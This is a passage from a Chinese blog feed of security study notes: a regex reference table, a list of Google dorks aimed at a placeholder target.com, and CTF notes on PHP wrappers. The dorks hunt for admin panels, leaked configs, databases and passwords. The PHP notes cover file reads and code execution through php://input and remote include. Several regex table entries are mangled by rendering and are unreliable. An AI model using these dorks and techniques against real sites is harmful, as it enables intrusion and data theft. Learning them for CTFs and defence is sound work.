class="table-container"><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>\</td><td>将下一个字符标记为一个特殊字符、或一个原义字符、或一个向后引用、或一个八进制转义符。例如，“<code>n</code>”匹配字符“<code>n</code>”。“<code>\n</code>”匹配一个换行符。串行“<code>\\</code>”匹配“<code>\</code>”而“<code>\(</code>”则匹配“<code>(</code>”。</td></tr><tr><td>^</td><td>匹配输入字符串的开始位置。如果设置了RegExp对象的Multiline属性，^也匹配“<code>\n</code>”或“<code>\r</code>”之后的位置。</td></tr><tr><td>$</td><td>匹配输入字符串的结束位置。如果设置了RegExp对象的Multiline属性，$也匹配“<code>\n</code>”或“<code>\r</code>”之前的位置。</td></tr><tr><td>*</td><td>匹配前面的子表达式零次或多次。例如，zo<em>能匹配“<code>z</code>”以及“<code>zoo</code>”。</em>等价于{0,}。</td></tr><tr><td>+</td><td>匹配前面的子表达式一次或多次。例如，“<code>zo+</code>”能匹配“<code>zo</code>”以及“<code>zoo</code>”，但不能匹配“<code>z</code>”。+等价于{1,}。</td></tr><tr><td>?</td><td>匹配前面的子表达式零次或一次。例如，“<code>do(es)?</code>”可以匹配“<code>does</code>”或“<code>does</code>”中的“<code>do</code>”。?等价于{0,1}。</td></tr><tr><td>{<em>n</em>}</td><td><em>n</em>是一个非负整数。匹配确定的<em>n</em>次。例如，“<code>o&#123;2&#125;</code>”不能匹配“<code>Bob</code>”中的“<code>o</code>”，但是能匹配“<code>food</code>”中的两个o。</td></tr><tr><td>{<em>n</em>,}</td><td><em>n</em>是一个非负整数。至少匹配<em>n</em>次。例如，“<code>o&#123;2,&#125;</code>”不能匹配“<code>Bob</code>”中的“<code>o</code>”，但能匹配“<code>foooood</code>”中的所有o。“<code>o&#123;1,&#125;</code>”等价于“<code>o+</code>”。“<code>o&#123;0,&#125;</code>”则等价于“<code>o*</code>”。</td></tr><tr><td>{<em>n</em>,<em>m</em>}</td><td><em>m</em>和<em>n</em>均为非负整数，其中<em>n</em>&lt;=<em>m</em>。最少匹配<em>n</em>次且最多匹配<em>m</em>次。例如，“<code>o&#123;1,3&#125;</code>”将匹配“<code>fooooood</code>”中的前三个o。“<code>o&#123;0,1&#125;</code>”等价于“<code>o?</code>”。请注意在逗号和两个数之间不能有空格。</td></tr><tr><td>?</td><td>当该字符紧跟在任何一个其他限制符（<em>,+,?，{</em>n<em>}，{</em>n<em>,}，{</em>n<em>,</em>m*}）后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串“<code>oooo</code>”，“<code>o+?</code>”将匹配单个“<code>o</code>”，而“<code>o+</code>”将匹配所有“<code>o</code>”。</td></tr><tr><td>.</td><td>匹配除“<code>\</code><em><code>n</code></em>”之外的任何单个字符。要匹配包括“<code>\</code><em><code>n</code></em>”在内的任何字符，请使用像“`(.</td></tr><tr><td>(pattern)</td><td>匹配pattern并获取这一匹配。所获取的匹配可以从产生的Matches集合得到，在VBScript中使用SubMatches集合，在JScript中则使用$0…$9属性。要匹配圆括号字符，请使用“<code>\(</code>”或“<code>\)</code>”。</td></tr><tr><td>(?:pattern)</td><td>匹配pattern但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用或字符“`(</td></tr><tr><td>(?=pattern)</td><td>正向肯定预查，在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，“`Windows(?=95</td></tr><tr><td>(?!pattern)</td><td>正向否定预查，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如“`Windows(?!95</td></tr><tr><td>(?&lt;=pattern)</td><td>反向肯定预查，与正向肯定预查类拟，只是方向相反。例如，“`(?&lt;=95</td></tr><tr><td>(?&lt;!pattern)</td><td>反向否定预查，与正向否定预查类拟，只是方向相反。例如“`(?&lt;!95</td></tr><tr><td>x\</td><td>y</td><td>匹配x或y。例如，“`z</td></tr><tr><td>[xyz]</td><td>字符集合。匹配所包含的任意一个字符。例如，“<code>[abc]</code>”可以匹配“<code>plain</code>”中的“<code>a</code>”。</td></tr><tr><td><a href="https://na0h.cn/笔记/学习正则表达式的一些笔记#fn-xyz">xyz</a></td><td>负值字符集合。匹配未包含的任意字符。例如，“<code>[^abc]</code>”可以匹配“<code>plain</code>”中的“<code>p</code>”。</td></tr><tr><td>[a-z]</td><td>字符范围。匹配指定范围内的任意字符。例如，“<code>[a-z]</code>”可以匹配“<code>a</code>”到“<code>z</code>”范围内的任意小写字母字符。</td></tr><tr><td><a href="https://na0h.cn/笔记/学习正则表达式的一些笔记#fn-a-z">a-z</a></td><td>负值字符范围。匹配任何不在指定范围内的任意字符。例如，“<code>[^a-z]</code>”可以匹配任何不在“<code>a</code>”到“<code>z</code>”范围内的任意字符。</td></tr><tr><td>\b</td><td>匹配一个单词边界，也就是指单词和空格间的位置。例如，“<code>er\b</code>”可以匹配“<code>never</code>”中的“<code>er</code>”，但不能匹配“<code>verb</code>”中的“<code>er</code>”。</td></tr><tr><td>\B</td><td>匹配非单词边界。“<code>er\B</code>”能匹配“<code>verb</code>”中的“<code>er</code>”，但不能匹配“<code>never</code>”中的“<code>er</code>”。</td></tr><tr><td>\cx</td><td>匹配由x指明的控制字符。例如，\cM匹配一个Control-M或回车符。x的值必须为A-Z或a-z之一。否则，将c视为一个原义的“<code>c</code>”字符。</td></tr><tr><td>\d</td><td>匹配一个数字字符。等价于[0-9]。</td></tr><tr><td>\D</td><td>匹配一个非数字字符。等价于<a href="https://na0h.cn/笔记/学习正则表达式的一些笔记#fn-0-9">0-9</a>。</td></tr><tr><td>\f</td><td>匹配一个换页符。等价于\x0c和\cL。</td></tr><tr><td>\n</td><td>匹配一个换行符。等价于\x0a和\cJ。</td></tr><tr><td>\r</td><td>匹配一个回车符。等价于\x0d和\cM。</td></tr><tr><td>\s</td><td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于[ \f\n\r\t\v]。</td></tr><tr><td>\S</td><td>匹配任何非空白字符。等价于<sup><a href="#fn_ \f\n\r\t\v" id="reffn_ \f\n\r\t\v"> \f\n\r\t\v</a></sup>。</td></tr><tr><td>\t</td><td>匹配一个制表符。等价于\x09和\cI。</td></tr><tr><td>\v</td><td>匹配一个垂直制表符。等价于\x0b和\cK。</td></tr><tr><td>\w</td><td>匹配包括下划线的任何单词字符。等价于“<code>[A-Za-z0-9_]</code>”。</td></tr><tr><td>\W</td><td>匹配任何非单词字符。等价于“<code>[^A-Za-z0-9_]</code>”。</td></tr><tr><td>\x<em>n</em></td><td>匹配<em>n</em>，其中<em>n</em>为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，“<code>\x41</code>”匹配“<code>A</code>”。“<code>\x041</code>”则等价于“<code>\x04&amp;1</code>”。正则表达式中可以使用ASCII编码。.</td></tr><tr><td><em>num</em></td><td>匹配<em>num</em>，其中<em>num</em>是一个正整数。对所获取的匹配的引用。例如，“<code>(.)\1</code>”匹配两个连续的相同字符。</td></tr><tr><td><em>n</em></td><td>标识一个八进制转义值或一个向后引用。如果<em>n</em>之前至少<em>n</em>个获取的子表达式，则<em>n</em>为向后引用。否则，如果<em>n</em>为八进制数字（0-7），则<em>n</em>为一个八进制转义值。</td></tr><tr><td><em>nm</em></td><td>标识一个八进制转义值或一个向后引用。如果<em>nm</em>之前至少有<em>nm</em>个获得子表达式，则<em>nm</em>为向后引用。如果*nm<em>之前至少有</em>n<em>个获取，则</em>n<em>为一个后跟文字</em>m<em>的向后引用。如果前面的条件都不满足，若</em>n<em>和</em>m<em>均为八进制数字（0-7），则</em>nm<em>将匹配八进制转义值</em>nm*。</td></tr><tr><td><em>nml</em></td><td>如果<em>n</em>为八进制数字（0-3），且<em>m和l</em>均为八进制数字（0-7），则匹配八进制转义值<em>nm</em>l。</td></tr><tr><td>\u<em>n</em></td><td>匹配<em>n</em>，其中<em>n</em>是一个用四个十六进制数字表示的Unicode字符。例如，\u00A9匹配版权符号（©）。</td></tr></tbody></table></div><h3 id="常用正则表达式"><a href="#常用正则表达式" class="headerlink" title="常用正则表达式"></a>常用正则表达式</h3><div class="table-container"><table><thead><tr><th>用户名</th><th>/^[a-z0-9_-]{3,16}$/</th></tr></thead><tbody><tr><td>密码</td><td>/^[a-z0-9_-]{6,18}$/</td></tr><tr><td>十六进制值</td><td>/^#?([a-f0-9]{6}\</td><td>[a-f0-9]{3})$/</td></tr><tr><td>电子邮箱</td><td>/^([a-z0-9_.-]+)@([\da-z.-]+).([a-z.]{2,6})$/ /^[a-z\d]+(.[a-z\d]+)*@(<a href="https://na0h.cn/笔记/-[/da-z]">\da-z</a>?)+(.{1,2}[a-z]+)+$/</td></tr><tr><td>URL</td><td>/^(https?:\/\/)?([\da-z.-]+).([a-z.]{2,6})([\/\w .-]<em>)</em>\/?$/</td></tr><tr><td>IP 地址</td><td>/((2[0-4]\d\</td><td>25[0-5]\</td><td>[01]?\d\d?).){3}(2[0-4]\d\</td><td>25[0-5]\</td><td>[01]?\d\d?)/ /^(?:(?:25[0-5]\</td><td>2[0-4][0-9]\</td><td>[01]?[0-9][0-9]?).){3}(?:25[0-5]\</td><td>2[0-4][0-9]\</td><td>[01]?[0-9][0-9]?)$/</td></tr><tr><td>HTML 标签</td><td>/^<a href="([a-z]+)([&lt;](https://na0h.cn/笔记/学习正则表达式的一些笔记#fn-&lt;)+)*(?:">([a-z]+)([&lt;](https://na0h.cn/笔记/学习正则表达式的一些笔记#fn-&lt;)+)*(?:</a>(.*)&lt;\/\1&gt;\</td><td>\s+\/&gt;)$/</td></tr><tr><td>删除代码\注释</td><td>(?&lt;!http:\</td><td>\S)//.*$</td></tr><tr><td>Unicode编码中的汉字范围</td><td>/^[\u2E80-\u9FFF]+$/</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Google hack</title>
      <link href="/posts/fd6a.html"/>
      <url>/posts/fd6a.html</url>
      
        <content type="html"><![CDATA[<h2 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google Hack"></a>Google Hack</h2><p><img src="https://s2.loli.net/2023/08/08/2lImhOtdqKgnkx5.png" alt="image.png"></p><p>下面我们先来看看Google的部分语法：</p><ul><li>intitle：搜索网页标题中包含有特定字符的网页。例如输入“intitle:ph p”，这样网页标题中带有php的网页都会被搜索出来。</li><li>inurl：搜索包含有特定字符的URL。例如输入“inurl:php”，则可以找到带有php字符的URL。</li><li>intext:搜索网页正文内容中的指定字符，例如输入“intext:php”。这个语法类似我们平时在某些网站中使用的“文章内容搜索”功能。</li><li>Filetype:搜索指定类型的文件。例如输入“filetype:php”，将返回所有以php结尾的文件URL。</li><li>Site：找到与指定网站有联系的URL。例如输入“Site：soho51.com”。所有和这个网站有联系的URL都会被显示。</li></ul><p>这些就是Google的常用语法，也是Google Hack的必用语法。虽然这只是Google语法中很小的部分，但是合理使用这些语法将产生意想不到的效果。</p><h3 id="GoogleHacking常用语法"><a href="#GoogleHacking常用语法" class="headerlink" title="GoogleHacking常用语法"></a>GoogleHacking常用语法</h3><ol><li>intext：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件</li><li>intitle：把网页标题中的某个字符作为搜索的条件</li><li>cache：搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息</li><li>filetype：指定一个格式类型的文件作为搜索对象</li><li>inurl：搜索包含指定字符的URL</li><li>site：在指定的(域名)站点搜索相关内容</li><li>Index of：　查找允许目录浏览的页面，比方说我想看看/admin目录下的文件（部分网站因为配置疏忽的原因，导致目录可以被所有人访问，目录的文件也可以被下载）</li></ol><h3 id="其他常见且实用的语法"><a href="#其他常见且实用的语法" class="headerlink" title="其他常见且实用的语法"></a>其他常见且实用的语法</h3><p>1、引号 ” ” 把关键字打上引号后，把引号部分作为整体来搜索2、or同时搜索两个或更多的关键字3、link搜索某个网站的链接 link:baidu.com即返回所有和baidu做了链接的URL4、info 查找指定站点的一些基本信息</p><h3 id="常见漏洞搜索举例："><a href="#常见漏洞搜索举例：" class="headerlink" title="常见漏洞搜索举例："></a>常见漏洞搜索举例：</h3><p>1.管理后台地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">site:target.com intext:管理</span><br><span class="line">site:target.com intext:后台</span><br><span class="line">site:target.com intext:登陆</span><br><span class="line">site:target.com intext:用户名</span><br><span class="line">site:target.com intext:login</span><br><span class="line">systemsite:target.com inurl:login |</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">inurl:admin</span><br><span class="line">inurl:manage</span><br><span class="line">inurl:manager</span><br><span class="line">inurl:admin_login</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inurl:system | inurl:backendsite:target.com intitle:管理</span><br><span class="line">inurl:system |inurl:backendsite:target.com intitle:登录</span><br><span class="line">inurl:system | inurl:backendsite:target.com intitle:后台管理</span><br></pre></td></tr></table></figure><p>2.上传类漏洞地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:target.com</span><br><span class="line">inurl:filesite:target.com</span><br><span class="line">inurl:upload</span><br></pre></td></tr></table></figure><p>3.注入页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:target.com inurl:php/asp?id=（批量注入工具、结合搜索引擎）inurl:Show.asp?Id=</span><br></pre></td></tr></table></figure><p>4.编辑器页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:target.com</span><br><span class="line">inurl:ewebeditor</span><br></pre></td></tr></table></figure><p>5.目录遍历漏洞<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:target.com</span><br><span class="line">intitle:index.of</span><br></pre></td></tr></table></figure></p><p>6.SQL错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:target.com intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected endofSQLcommand&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:”Warning: mysql_query()&quot;| intext:”Warning: pg_connect()&quot;phpinfo()</span><br><span class="line">site:target.com ext:php intitle:phpinfo &quot;</span><br></pre></td></tr></table></figure><p>7.配置文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site:target.com ext:.xml</span><br><span class="line">site:target.com ext:.ini</span><br><span class="line">site:target.com ext:.conf </span><br><span class="line">site:target.com ext:.inf</span><br></pre></td></tr></table></figure><p>8.数据库文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:target.com ext:.sql | .dbf | .mdb | .db 日志文件泄露</span><br><span class="line">site:target.com ext:.log</span><br></pre></td></tr></table></figure><p>9.备份和历史文件泄露<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site:target.com ext:.bkf</span><br><span class="line">site:target.com ext:.old</span><br><span class="line">site:target.com ext:.zip</span><br><span class="line">site:target.com ext:.tar</span><br></pre></td></tr></table></figure></p><p>10.公开文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">site:target.com filetype:.doc</span><br><span class="line">site:target.com filetype:.ppt</span><br><span class="line">site:target.com filetype:.xlsx</span><br><span class="line">site:target.com filetype:.csv</span><br><span class="line">site:target.com filetype:.psw</span><br></pre></td></tr></table></figure><p>11.邮箱信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:target.com intext:@target.com</span><br><span class="line">site:target.com 邮件site:target.com email</span><br></pre></td></tr></table></figure><p>12.社工信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">site:target.com intitle:账号</span><br><span class="line">site:target.com intitle:密码</span><br><span class="line">site:target.com intitle:工号</span><br><span class="line">site:target.com intitle:学号</span><br><span class="line">site:target.com intitle:身份证</span><br></pre></td></tr></table></figure><p>13.查找网站管理后台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">site:xxx intitle:管理|后台|登录|用户名|密码|验证码|系统|账号|后台管理|后台登录</span><br><span class="line">site:xxx intext:管理|后台|登录|用户名|密码|验证码|系统|账号|后台管理|后台登录</span><br><span class="line">site:xxx.com intext:</span><br><span class="line">site:xxxx.com intext:管理 </span><br><span class="line">site:xxxx.com inurl:login </span><br><span class="line">site:xxxx.com intitle:管理</span><br></pre></td></tr></table></figure><p>14.查找邮箱及其配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.com smtp</span><br><span class="line">site:xxx.com smtp @qq.com </span><br><span class="line">site:xxx.com smtp @126.com</span><br><span class="line">site:xxx.com smtp @163.com</span><br><span class="line">site:xxx.com smtp @sina.com.cn</span><br><span class="line">site:xxx.com smtp password</span><br></pre></td></tr></table></figure><p>15.数据库信息泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.com sa password</span><br><span class="line">site:xxx.com root password</span><br><span class="line">site:xxx.com User ID=&#x27;sa&#x27;;Password</span><br></pre></td></tr></table></figure><p>16.敏感信息搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">site:xxx inurl:file</span><br><span class="line">site:xxx inurl:load</span><br><span class="line">site:xxx inurl:php?id=</span><br><span class="line">site:xxx inurl:asp?id=</span><br><span class="line">site:xxx inurl:fck</span><br><span class="line">site:xxx inurl:ewebeditor</span><br><span class="line">cache：xxx.com               搜索服务器缓存</span><br></pre></td></tr></table></figure><p>17.寻找特定漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">site:域名 inurl:php?id= </span><br><span class="line"></span><br><span class="line">site:xxx inurl:login　　　　　　　搜索xxx网站login页面是否存在sql注入</span><br><span class="line">inurl:login.php                               搜索网址中含有login.php网页</span><br><span class="line">intitle:后台管理 filetype:php          搜索标题是后台管理的php页面</span><br><span class="line">intitle:index of&quot;parent directory&quot;搜索根目录星官的索引目录信息</span><br><span class="line">intext:Powered bywordpress       搜索word press制作的博客网址</span><br><span class="line">intext:Powered by*CMS              搜索*CMS相关的页面</span><br><span class="line">intext:powered byxxx inurl:login  搜索此类网站的后台登陆页面</span><br><span class="line">parent directory site:xxx               搜索xxx网站的目录结构</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议的学习</title>
      <link href="/posts/8.html"/>
      <url>/posts/8.html</url>
      
        <content type="html"><![CDATA[<h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><p>php支持的伪协议如下：（<a href="https://www.php.net/manual/zh/wrappers.php">PHP: 支持的协议和封装协议 - Manual</a>）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line">data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — 音频流</span></span><br><span class="line">expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure><blockquote><p>在php.ini中，allow_url_fopen 和allow_url_include会影响到fopen等等和include等等函数对于伪协议的支持； 且allow_url_include依赖allow_url_fopen，所以allow_url_fopen不开启的话，allow_url_include也是无法使用的</p></blockquote><h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a>file:// 协议</h2><ul><li><p>file:// — 访问本地文件系统； ctf中常用于读取本地文件、配合curl_exec实现任意文件读取（curl支持伪协议）</p></li><li><p>条件：</p><ul><li>allow_url_fopen:off/on</li><li>allow_url_include :off/on</li></ul></li><li><p>作用：<br>  用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。<br>  include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。</p></li><li><p>说明：<br>  file:// 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen() 和 file_get_contents()，include_path 会可选地搜索，也作为相对的路径。</p></li><li><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?xxx=file://文件的绝对路径和文件名</span><br><span class="line"></span><br><span class="line">eg: ?xxx=file://C:/Users/hungs/Desktop/eg.txt</span><br><span class="line"></span><br><span class="line">file://[文件的绝对路径和文件名]</span><br><span class="line">file://[文件的相对路径和文件名]</span><br><span class="line">file://[文件的网络路径和文件名]  </span><br></pre></td></tr></table></figure></li></ul><h2 id="http-amp-https-协议"><a href="#http-amp-https-协议" class="headerlink" title="http:// &amp; https:// 协议"></a>http:// &amp; https:// 协议</h2><ul><li>条件：<ul><li>allow_url_fopen:on</li><li>allow_url_include :on</li></ul></li><li>作用：常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</li><li>用法：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure></li></ul><h2 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a>php:// 协议</h2><ul><li><p><strong>条件</strong>：</p><ul><li>allow_url_fopen:off/on</li><li>allow_url_include :仅php://input php://stdin      php://memory php://temp 需要on</li></ul></li><li><p><strong>作用</strong>：php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于<strong>读取源码</strong>，php://input用于<strong>执行php代码</strong>。</p></li><li><p><strong>说明</strong>：PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p></li></ul><div class="table-container"><table><thead><tr><th><strong>协议</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=”multipart/form-data” 的时候php://input 是无效的。</td></tr><tr><td>php://output</td><td>只写的数据流，允许以  print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。</td></tr><tr><td>php://memory  php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table></div><p><strong>php://filter参数详解</strong>：该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p><div class="table-container"><table><thead><tr><th><strong>php://filter参数</strong></th><th><strong>描述</strong></th><th></th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td><td></td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td><td>*）分隔。</td></tr><tr><td>write=&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td><td>）分隔。</td></tr><tr><td>&lt;;  两个链的过滤器&gt;</td><td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table></div><p><strong>可用的过滤器列表（4类）</strong>：此处列举主要的过滤器类型，详细内容请参考：<a href="https://link.segmentfault.com/?enc=qj5AtjN9T4nKXd35G%2Be%2FGQ%3D%3D.T8xfksAALHxWxpIBCTGQqyxEXnerbeIHgd7Cc4CtqHf6%2FI%2FdjMh7DVCzS%2BYKx%2B1I">https://www.php.net/manual/zh/filters.php</a></p><div class="table-container"><table><thead><tr><th><strong>字符串过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于str_rot13()，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于strtoupper()，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于strtolower()，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于strip_tags()，去除html、PHP语言标签</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th><strong>转换过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>convert.base64-encode  &amp; convert.base64-decode</td><td>等同于base64_encode()和base64_decode()，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode  &amp; convert.quoted-printable-decode</td><td>quoted-printable  字符串与 8-bit 字符串编码解码</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th><strong>压缩过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>zlib.deflate  &amp; zlib.inflate</td><td>在本地文件系统中创建  gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress  &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建  bz2 兼容文件的方法。</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th><strong>加密过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt  对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt  对称解密算法</td></tr></tbody></table></div><p>举例<br><figure 